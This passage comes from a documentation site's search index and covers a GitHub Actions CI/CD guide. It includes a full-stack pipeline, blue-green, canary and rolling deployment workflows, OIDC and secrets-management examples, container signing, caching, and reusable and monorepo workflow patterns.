staging, production workflows</li> <li>\u2705 Security Best Practices: Secrets management, OIDC, security scanning</li> <li>\u2705 Performance Optimization: Caching, matrix builds, reusable workflows</li> <li>\u2705 Advanced Patterns: Monorepos, microservices, blue-green deployments</li> <li>\u2705 Real-World Examples: Production-ready workflow templates</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#related-documentation","title":"Related Documentation","text":"<ul> <li>Syntax Reference: See GitHub Actions Language Guide   for YAML syntax and basic concepts</li> <li>Validation Pipeline: See AI Validation Pipeline for quality checks</li> </ul>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#cicd-pipeline-workflow","title":"CI/CD Pipeline Workflow","text":"<p>This diagram illustrates a complete CI/CD pipeline flow from code commit to production deployment:</p> <pre><code>flowchart TD\n    Start([Code Push/PR]) --&gt; Validate[Validation Stage]\n\n    Validate --&gt; Lint[Lint Code]\n    Validate --&gt; Format[Check Formatting]\n    Validate --&gt; Types[Type Checking]\n    Validate --&gt; Security[Security Scan]\n\n    Lint --&gt; TestStage{All Checks Pass?}\n    Format --&gt; TestStage\n    Types --&gt; TestStage\n    Security --&gt; TestStage\n\n    TestStage --&gt;|No| FailFast[\u274c Fail Fast&lt;br/&gt;Notify Team]\n    TestStage --&gt;|Yes| UnitTests[Unit Tests]\n\n    UnitTests --&gt; IntTests[Integration Tests]\n    IntTests --&gt; E2E[E2E Tests]\n\n    E2E --&gt; AllTests{All Tests Pass?}\n\n    AllTests --&gt;|No| FailTests[\u274c Test Failure&lt;br/&gt;Generate Report]\n    AllTests --&gt;|Yes| Build[Build Stage]\n\n    Build --&gt; BuildApp[Build Application]\n    BuildApp --&gt; BuildImage[Build Container Image]\n    BuildImage --&gt; ScanImage[Scan Image]\n\n    ScanImage --&gt; BuildSuccess{Build OK?}\n\n    BuildSuccess --&gt;|No| FailBuild[\u274c Build Failed]\n    BuildSuccess --&gt;|Yes| DeployStaging[Deploy to Staging]\n\n    DeployStaging --&gt; SmokeTests[Smoke Tests]\n    SmokeTests --&gt; StagingOK{Staging OK?}\n\n    StagingOK --&gt;|No| Rollback[\ud83d\udd04 Rollback Staging]\n    StagingOK --&gt;|Yes| Approval{Manual Approval?}\n\n    Approval --&gt;|Rejected| Stop[\u23f8\ufe0f Deployment Stopped]\n    Approval --&gt;|Approved| DeployProd[Deploy to Production]\n\n    DeployProd --&gt; BlueGreen[Blue-Green Switch]\n    BlueGreen --&gt; HealthCheck[Health Checks]\n\n    HealthCheck --&gt; ProdOK{Production OK?}\n\n    ProdOK --&gt;|No| RollbackProd[\ud83d\udd04 Rollback Production]\n    ProdOK --&gt;|Yes| Success[\u2705 Deployment Complete&lt;br/&gt;Notify Team]\n\n    RollbackProd --&gt; Notify[\ud83d\udce2 Alert On-Call]\n    Rollback --&gt; Notify\n    FailBuild --&gt; Notify\n    FailTests --&gt; Notify\n    FailFast --&gt; Notify</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#complete-cicd-pipeline-example","title":"Complete CI/CD Pipeline Example","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#full-stack-application-pipeline","title":"Full-Stack Application Pipeline","text":"<pre><code>name: Full-Stack CI/CD\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n  workflow_dispatch:\n\nenv:\n  NODE_VERSION: '20'\n  PYTHON_VERSION: '3.11'\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\njobs:\n  # ====================\n  # VALIDATION STAGE\n  # ====================\n  lint-frontend:\n    name: Lint Frontend\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ env.NODE_VERSION }}\n          cache: 'npm'\n          cache-dependency-path: frontend/package-lock.json\n\n      - name: Install dependencies\n        working-directory: frontend\n        run: npm ci\n\n      - name: Run ESLint\n        working-directory: frontend\n        run: npm run lint\n\n      - name: Run Prettier\n        working-directory: frontend\n        run: npm run format:check\n\n      - name: Type check\n        working-directory: frontend\n        run: npm run type-check\n\n  lint-backend:\n    name: Lint Backend\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ env.PYTHON_VERSION }}\n          cache: 'pip'\n          cache-dependency-path: backend/requirements*.txt\n\n      - name: Install dependencies\n        working-directory: backend\n        run: |\n          pip install black flake8 mypy pylint\n          pip install -r requirements.txt\n\n      - name: Run Black\n        working-directory: backend\n        run: black --check .\n\n      - name: Run Flake8\n        working-directory: backend\n        run: flake8 .\n\n      - name: Run MyPy\n        working-directory: backend\n        run: mypy . --ignore-missing-imports\n\n  # ====================\n  # SECURITY STAGE\n  # ====================\n  security-scan:\n    name: Security Scan\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    permissions:\n      security-events: write\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run Trivy vulnerability scanner\n        uses: aquasecurity/trivy-action@master\n        with:\n          scan-type: 'fs'\n          scan-ref: '.'\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n          severity: 'CRITICAL,HIGH'\n\n      - name: Upload Trivy results to GitHub Security\n        uses: github/codeql-action/upload-sarif@v3\n        if: always()\n        with:\n          sarif_file: 'trivy-results.sarif'\n\n      - name: Run Snyk security scan\n        uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n        with:\n          args: --severity-threshold=high\n\n  # ====================\n  # TEST STAGE\n  # ====================\n  test-frontend:\n    name: Test Frontend\n    runs-on: ubuntu-latest\n    needs: [lint-frontend]\n    timeout-minutes: 20\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ env.NODE_VERSION }}\n          cache: 'npm'\n          cache-dependency-path: frontend/package-lock.json\n\n      - name: Install dependencies\n        working-directory: frontend\n        run: npm ci\n\n      - name: Run unit tests\n        working-directory: frontend\n        run: npm run test:unit -- --coverage\n\n      - name: Run integration tests\n        working-directory: frontend\n        run: npm run test:integration\n\n      - name: Upload coverage\n        uses: codecov/codecov-action@v4\n        with:\n          files: ./frontend/coverage/lcov.info\n          flags: frontend\n          token: ${{ secrets.CODECOV_TOKEN }}\n\n  test-backend:\n    name: Test Backend\n    runs-on: ubuntu-latest\n    needs: [lint-backend]\n    timeout-minutes: 20\n\n    services:\n      postgres:\n        image: postgres:15\n        env:\n          POSTGRES_PASSWORD: postgres\n          POSTGRES_DB: testdb\n        options: &gt;-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          - 5432:5432\n\n      redis:\n        image: redis:7\n        options: &gt;-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          - 6379:6379\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ env.PYTHON_VERSION }}\n          cache: 'pip'\n          cache-dependency-path: backend/requirements*.txt\n\n      - name: Install dependencies\n        working-directory: backend\n        run: |\n          pip install pytest pytest-cov pytest-asyncio\n          pip install -r requirements.txt\n\n      - name: Run unit tests\n        working-directory: backend\n        env:\n          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/testdb\n          REDIS_URL: redis://localhost:6379/0\n        run: pytest tests/unit -v --cov --cov-report=xml\n\n      - name: Run integration tests\n        working-directory: backend\n        env:\n          DATABASE_URL: postgresql://postgres:postgres@localhost:5432/testdb\n          REDIS_URL: redis://localhost:6379/0\n        run: pytest tests/integration -v\n\n      - name: Upload coverage\n        uses: codecov/codecov-action@v4\n        with:\n          files: ./backend/coverage.xml\n          flags: backend\n          token: ${{ secrets.CODECOV_TOKEN }}\n\n  # ====================\n  # BUILD STAGE\n  # ====================\n  build-frontend:\n    name: Build Frontend\n    runs-on: ubuntu-latest\n    needs: [test-frontend, security-scan]\n    timeout-minutes: 15\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ env.NODE_VERSION }}\n          cache: 'npm'\n          cache-dependency-path: frontend/package-lock.json\n\n      - name: Install dependencies\n        working-directory: frontend\n        run: npm ci\n\n      - name: Build application\n        working-directory: frontend\n        run: npm run build\n        env:\n          NODE_ENV: production\n\n      - name: Upload build artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: frontend-build\n          path: frontend/dist\n          retention-days: 7\n\n  build-backend-image:\n    name: Build Backend Docker Image\n    runs-on: ubuntu-latest\n    needs: [test-backend, security-scan]\n    timeout-minutes: 20\n    permissions:\n      contents: read\n      packages: write\n\n    outputs:\n      image-tag: ${{ steps.meta.outputs.tags }}\n      image-digest: ${{ steps.build.outputs.digest }}\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Log in to Container Registry\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Extract metadata\n        id: meta\n        uses: docker/metadata-action@v5\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n          tags: |\n            type=ref,event=branch\n            type=ref,event=pr\n            type=semver,pattern={{version}}\n            type=semver,pattern={{major}}.{{minor}}\n            type=sha,prefix={{branch}}-\n\n      - name: Build and push Docker image\n        id: build\n        uses: docker/build-push-action@v5\n        with:\n          context: ./backend\n          file: ./backend/Dockerfile\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n          platforms: linux/amd64,linux/arm64\n\n      - name: Scan image with Trivy\n        uses: aquasecurity/trivy-action@master\n        with:\n          image-ref: ${{ steps.meta.outputs.tags }}\n          format: 'sarif'\n          output: 'trivy-image-results.sarif'\n\n      - name: Upload Trivy results\n        uses: github/codeql-action/upload-sarif@v3\n        if: always()\n        with:\n          sarif_file: 'trivy-image-results.sarif'\n\n  # ====================\n  # DEPLOY TO STAGING\n  # ====================\n  deploy-staging:\n    name: Deploy to Staging\n    runs-on: ubuntu-latest\n    needs: [build-frontend, build-backend-image]\n    if: github.ref == 'refs/heads/develop' || github.event_name == 'pull_request'\n    timeout-minutes: 15\n    environment:\n      name: staging\n      url: https://staging.example.com\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Download frontend artifacts\n        uses: actions/download-artifact@v4\n        with:\n          name: frontend-build\n          path: frontend/dist\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: ${{ secrets.AWS_ROLE_ARN_STAGING }}\n          aws-region: us-east-1\n\n      - name: Deploy frontend to S3\n        run: |\n          aws s3 sync frontend/dist s3://${{ secrets.S3_BUCKET_STAGING }} \\\n            --delete \\\n            --cache-control \"public, max-age=31536000\"\n\n      - name: Invalidate CloudFront cache\n        run: |\n          aws cloudfront create-invalidation \\\n            --distribution-id ${{ secrets.CLOUDFRONT_DIST_ID_STAGING }} \\\n            --paths \"/*\"\n\n      - name: Deploy backend to ECS\n        run: |\n          aws ecs update-service \\\n            --cluster staging-cluster \\\n            --service backend-service \\\n            --force-new-deployment \\\n            --wait\n\n      - name: Wait for deployment\n        run: |\n          aws ecs wait services-stable \\\n            --cluster staging-cluster \\\n            --services backend-service\n\n  # ====================\n  # SMOKE TESTS\n  # ====================\n  smoke-tests:\n    name: Smoke Tests\n    runs-on: ubuntu-latest\n    needs: [deploy-staging]\n    timeout-minutes: 10\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ env.NODE_VERSION }}\n\n      - name: Install dependencies\n        run: npm install -g newman\n\n      - name: Run API smoke tests\n        run: |\n          newman run tests/postman/smoke-tests.json \\\n            --env-var \"baseUrl=https://staging.example.com/api\" \\\n            --bail\n\n      - name: Check frontend health\n        run: |\n          curl -f https://staging.example.com/health || exit 1\n\n      - name: Run Lighthouse CI\n        uses: treosh/lighthouse-ci-action@v10\n        with:\n          urls: |\n            https://staging.example.com\n          uploadArtifacts: true\n\n  # ====================\n  # DEPLOY TO PRODUCTION\n  # ====================\n  deploy-production:\n    name: Deploy to Production\n    runs-on: ubuntu-latest\n    needs: [smoke-tests]\n    if: github.ref == 'refs/heads/main'\n    timeout-minutes: 30\n    environment:\n      name: production\n      url: https://example.com\n    concurrency:\n      group: production-deployment\n      cancel-in-progress: false\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Download frontend artifacts\n        uses: actions/download-artifact@v4\n        with:\n          name: frontend-build\n          path: frontend/dist\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: ${{ secrets.AWS_ROLE_ARN_PRODUCTION }}\n          aws-region: us-east-1\n\n      - name: Deploy frontend to S3\n        run: |\n          aws s3 sync frontend/dist s3://${{ secrets.S3_BUCKET_PRODUCTION }} \\\n            --delete \\\n            --cache-control \"public, max-age=31536000\"\n\n      - name: Invalidate CloudFront cache\n        run: |\n          aws cloudfront create-invalidation \\\n            --distribution-id ${{ secrets.CLOUDFRONT_DIST_ID_PRODUCTION }} \\\n            --paths \"/*\"\n\n      - name: Blue-Green Deploy backend to ECS\n        run: |\n          # Deploy to green environment\n          aws ecs update-service \\\n            --cluster production-cluster \\\n            --service backend-service-green \\\n            --force-new-deployment \\\n            --wait\n\n          # Wait for green to be healthy\n          aws ecs wait services-stable \\\n            --cluster production-cluster \\\n            --services backend-service-green\n\n          # Switch traffic to green\n          aws elbv2 modify-target-group \\\n            --target-group-arn ${{ secrets.TARGET_GROUP_ARN }} \\\n            --targets Id=backend-service-green\n\n          # Wait for blue to drain\n          sleep 60\n\n          # Update blue to new version\n          aws ecs update-service \\\n            --cluster production-cluster \\\n            --service backend-service-blue \\\n            --force-new-deployment\n\n      - name: Create deployment marker\n        run: |\n          curl -X POST https://api.datadoghq.com/api/v1/events \\\n            -H \"DD-API-KEY: ${{ secrets.DATADOG_API_KEY }}\" \\\n            -H \"Content-Type: application/json\" \\\n            -d '{\n              \"title\": \"Production Deployment\",\n              \"text\": \"Deployed ${{ github.sha }} to production\",\n              \"tags\": [\"env:production\", \"service:backend\"]\n            }'\n\n  # ====================\n  # POST-DEPLOYMENT\n  # ====================\n  production-smoke-tests:\n    name: Production Smoke Tests\n    runs-on: ubuntu-latest\n    needs: [deploy-production]\n    timeout-minutes: 10\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run production smoke tests\n        run: |\n          newman run tests/postman/smoke-tests.json \\\n            --env-var \"baseUrl=https://example.com/api\" \\\n            --bail\n\n      - name: Notify on failure\n        if: failure()\n        uses: 8398a7/action-slack@v3\n        with:\n          status: ${{ job.status }}\n          webhook_url: ${{ secrets.SLACK_WEBHOOK }}\n          text: 'Production smoke tests failed! Immediate attention required.'\n\n  notify-deployment:\n    name: Notify Deployment\n    runs-on: ubuntu-latest\n    needs: [production-smoke-tests]\n    if: always()\n\n    steps:\n      - name: Notify Slack\n        uses: 8398a7/action-slack@v3\n        with:\n          status: ${{ job.status }}\n          webhook_url: ${{ secrets.SLACK_WEBHOOK }}\n          text: |\n            Deployment Result: ${{ job.status }}\n            Commit: ${{ github.sha }}\n            Author: ${{ github.actor }}\n            Ref: ${{ github.ref }}\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#deployment-strategies","title":"Deployment Strategies","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#blue-green-deployment","title":"Blue-Green Deployment","text":"<pre><code>name: Blue-Green Deployment\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n\n    steps:\n      - name: Deploy to green environment\n        run: |\n          kubectl apply -f k8s/green/\n\n      - name: Wait for green to be ready\n        run: |\n          kubectl wait --for=condition=ready pod \\\n            -l app=myapp,slot=green \\\n            --timeout=5m\n\n      - name: Run smoke tests on green\n        run: |\n          curl -f https://green.example.com/health || exit 1\n\n      - name: Switch traffic to green\n        run: |\n          kubectl patch service myapp-service \\\n            -p '{\"spec\":{\"selector\":{\"slot\":\"green\"}}}'\n\n      - name: Monitor for 5 minutes\n        run: |\n          sleep 300\n\n      - name: Update blue environment\n        run: |\n          kubectl apply -f k8s/blue/\n\n      - name: Rollback on failure\n        if: failure()\n        run: |\n          kubectl patch service myapp-service \\\n            -p '{\"spec\":{\"selector\":{\"slot\":\"blue\"}}}'\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#canary-deployment","title":"Canary Deployment","text":"<pre><code>name: Canary Deployment\n\njobs:\n  deploy-canary:\n    runs-on: ubuntu-latest\n    environment: production\n\n    steps:\n      - name: Deploy canary (10% traffic)\n        run: |\n          kubectl apply -f k8s/canary/\n          kubectl patch virtualservice myapp \\\n            -p '{\"spec\":{\"http\":[{\"weight\":10,\"route\":[{\"destination\":\"canary\"}]},{\"weight\":90,\"route\":[{\"destination\":\"stable\"}]}]}}'\n\n      - name: Monitor metrics for 10 minutes\n        run: |\n          sleep 600\n\n      - name: Check error rate\n        id: metrics\n        run: |\n          ERROR_RATE=$(curl -s \"https://monitoring.example.com/api/error-rate\")\n          if [ \"$ERROR_RATE\" -gt \"1\" ]; then\n            echo \"rollback=true\" &gt;&gt; $GITHUB_OUTPUT\n          fi\n\n      - name: Rollback if error rate high\n        if: steps.metrics.outputs.rollback == 'true'\n        run: |\n          kubectl delete -f k8s/canary/\n          kubectl patch virtualservice myapp \\\n            -p '{\"spec\":{\"http\":[{\"weight\":100,\"route\":[{\"destination\":\"stable\"}]}]}}'\n          exit 1\n\n      - name: Gradually increase traffic\n        if: success()\n        run: |\n          for weight in 25 50 75 100; do\n            kubectl patch virtualservice myapp \\\n              -p \"{\\\"spec\\\":{\\\"http\\\":[{\\\"weight\\\":$weight,\\\"route\\\":[{\\\"destination\\\":\\\"canary\\\"}]},{\\\"weight\\\":$((100-weight)),\\\"route\\\":[{\\\"destination\\\":\\\"stable\\\"}]}]}}\"\n            sleep 300\n          done\n\n      - name: Promote canary to stable\n        run: |\n          kubectl apply -f k8s/stable/\n          kubectl delete -f k8s/canary/\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#rolling-deployment","title":"Rolling Deployment","text":"<pre><code>name: Rolling Deployment\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n\n    steps:\n      - name: Update deployment with rolling strategy\n        run: |\n          kubectl set image deployment/myapp \\\n            myapp=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }} \\\n            --record\n\n      - name: Watch rollout status\n        run: |\n          kubectl rollout status deployment/myapp --timeout=10m\n\n      - name: Verify deployment\n        run: |\n          kubectl get deployment myapp -o jsonpath='{.status.conditions[?(@.type==\"Available\")].status}'\n\n      - name: Rollback on failure\n        if: failure()\n        run: |\n          kubectl rollout undo deployment/myapp\n          kubectl rollout status deployment/myapp --timeout=10m\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#security-best-practices","title":"Security Best Practices","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#openid-connect-oidc-for-aws","title":"OpenID Connect (OIDC) for AWS","text":"<pre><code>name: OIDC AWS Deployment\n\npermissions:\n  id-token: write\n  contents: read\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS credentials with OIDC\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole\n          role-session-name: github-actions-deploy\n          aws-region: us-east-1\n\n      - name: Deploy to S3\n        run: aws s3 sync ./dist s3://my-bucket\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#oidc-aws-iam-role-trust-policy","title":"OIDC AWS IAM Role Trust Policy","text":"<pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Federated\": \"arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com\"\n      },\n      \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\"\n        },\n        \"StringLike\": {\n          \"token.actions.githubusercontent.com:sub\": \"repo:myorg/myrepo:ref:refs/heads/main\"\n        }\n      }\n    }\n  ]\n}\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#secrets-management","title":"Secrets Management","text":"<pre><code>jobs:\n  deploy:\n    runs-on: ubuntu-latest\n\n    steps:\n      # Use GitHub Secrets\n      - name: Deploy with secrets\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n          DATABASE_URL: ${{ secrets.DATABASE_URL }}\n        run: ./deploy.sh\n\n      # Use HashiCorp Vault\n      - name: Import secrets from Vault\n        uses: hashicorp/vault-action@v2\n        with:\n          url: https://vault.example.com\n          method: jwt\n          role: github-actions\n          secrets: |\n            secret/data/myapp api_key | API_KEY ;\n            secret/data/myapp db_url | DATABASE_URL\n\n      # Use AWS Secrets Manager\n      - name: Get secrets from AWS\n        uses: aws-actions/aws-secretsmanager-get-secrets@v1\n        with:\n          secret-ids: |\n            myapp/api-key\n            myapp/database-url\n          parse-json-secrets: true\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#container-signing-and-verification","title":"Container Signing and Verification","text":"<pre><code>jobs:\n  build-and-sign:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n      id-token: write\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install Cosign\n        uses: sigstore/cosign-installer@v3\n\n      - name: Build image\n        uses: docker/build-push-action@v5\n        id: build\n        with:\n          push: true\n          tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest\n\n      - name: Sign image with Cosign\n        run: |\n          cosign sign --yes ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}\n\n      - name: Generate SBOM\n        uses: anchore/sbom-action@v0\n        with:\n          image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}\n          format: spdx-json\n          output-file: sbom.spdx.json\n\n      - name: Attach SBOM to image\n        run: |\n          cosign attach sbom --sbom sbom.spdx.json \\\n            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#performance-optimization","title":"Performance Optimization","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#matrix-builds","title":"Matrix Builds","text":"<pre><code>jobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    timeout-minutes: 20\n\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [ubuntu-latest, windows-latest, macos-latest]\n        node-version: [18, 20, 21]\n        include:\n          - os: ubuntu-latest\n            node-version: 20\n            coverage: true\n        exclude:\n          - os: macos-latest\n            node-version: 18\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n          cache: 'npm'\n\n      - name: Run tests\n        run: npm test\n\n      - name: Upload coverage\n        if: matrix.coverage\n        uses: codecov/codecov-action@v4\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#advanced-caching","title":"Advanced Caching","text":"<pre><code>jobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      # Cache npm dependencies\n      - name: Cache node modules\n        uses: actions/cache@v3\n        with:\n          path: ~/.npm\n          key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}\n          restore-keys: |\n            ${{ runner.os }}-npm-\n\n      # Cache build output\n      - name: Cache build\n        uses: actions/cache@v3\n        with:\n          path: |\n            dist\n            .next/cache\n          key: ${{ runner.os }}-build-${{ github.sha }}\n          restore-keys: |\n            ${{ runner.os }}-build-\n\n      # Cache Docker layers\n      - name: Cache Docker layers\n        uses: actions/cache@v3\n        with:\n          path: /tmp/.buildx-cache\n          key: ${{ runner.os }}-buildx-${{ github.sha }}\n          restore-keys: |\n            ${{ runner.os }}-buildx-\n\n      - name: Build with layer caching\n        uses: docker/build-push-action@v5\n        with:\n          cache-from: type=local,src=/tmp/.buildx-cache\n          cache-to: type=local,dest=/tmp/.buildx-cache-new,mode=max\n\n      # Cleanup old cache\n      - name: Move cache\n        run: |\n          rm -rf /tmp/.buildx-cache\n          mv /tmp/.buildx-cache-new /tmp/.buildx-cache\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#conditional-job-execution","title":"Conditional Job Execution","text":"<pre><code>jobs:\n  changes:\n    runs-on: ubuntu-latest\n    outputs:\n      frontend: ${{ steps.filter.outputs.frontend }}\n      backend: ${{ steps.filter.outputs.backend }}\n      infrastructure: ${{ steps.filter.outputs.infrastructure }}\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: dorny/paths-filter@v2\n        id: filter\n        with:\n          filters: |\n            frontend:\n              - 'frontend/**'\n            backend:\n              - 'backend/**'\n            infrastructure:\n              - 'infrastructure/**'\n\n  test-frontend:\n    needs: changes\n    if: needs.changes.outputs.frontend == 'true'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Testing frontend\"\n\n  test-backend:\n    needs: changes\n    if: needs.changes.outputs.backend == 'true'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Testing backend\"\n\n  deploy-infrastructure:\n    needs: changes\n    if: needs.changes.outputs.infrastructure == 'true'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploying infrastructure\"\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#reusable-workflows","title":"Reusable Workflows","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#caller-workflow","title":"Caller Workflow","text":"<pre><code>## .github/workflows/deploy.yml\nname: Deploy Application\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy-staging:\n    uses: ./.github/workflows/reusable-deploy.yml\n    with:\n      environment: staging\n      aws-region: us-east-1\n    secrets:\n      aws-role-arn: ${{ secrets.AWS_ROLE_ARN_STAGING }}\n\n  deploy-production:\n    needs: deploy-staging\n    uses: ./.github/workflows/reusable-deploy.yml\n    with:\n      environment: production\n      aws-region: us-east-1\n      require-approval: true\n    secrets:\n      aws-role-arn: ${{ secrets.AWS_ROLE_ARN_PRODUCTION }}\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#reusable-workflow","title":"Reusable Workflow","text":"<pre><code>## .github/workflows/reusable-deploy.yml\nname: Reusable Deploy\n\non:\n  workflow_call:\n    inputs:\n      environment:\n        required: true\n        type: string\n      aws-region:\n        required: true\n        type: string\n      require-approval:\n        required: false\n        type: boolean\n        default: false\n    secrets:\n      aws-role-arn:\n        required: true\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment:\n      name: ${{ inputs.environment }}\n      url: https://${{ inputs.environment }}.example.com\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: ${{ secrets.aws-role-arn }}\n          aws-region: ${{ inputs.aws-region }}\n\n      - name: Deploy application\n        run: |\n          echo \"Deploying to ${{ inputs.environment }}\"\n          ./deploy.sh\n</code></pre>","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#monorepo-patterns","title":"Monorepo Patterns","text":"","tags":["github-actions","cicd","deployment","automation","devops","pipelines"]},{"location":"05_ci_cd/github_actions_guide/#turborepo-with-selective-builds","title":"Turborepo with Selective Builds","text":"<pre><code>name: Monorepo CI\n\non:\n  pull_request:\n    branches: [main]\n\njobs:\n  changes:\n    runs-on: ubuntu-latest\n    outputs:\n      packages: ${{ steps.filter.outputs.changes }}\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: dorny/paths-filter@v2\n        id: filter\n        with:\n          filters: |\n            web: packages/web/**\n            api: packages/api/**\n            shared: packages/shared/**\n\n  build:\n    needs: changes\n    if: ${{ needs.changes.outputs.packages != '[]' }}\n    runs-on: ubuntu-latest\n\n    strategy:\n      matrix:\n        package: ${{ fromJSON(needs.changes.outputs.packages) }}\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: 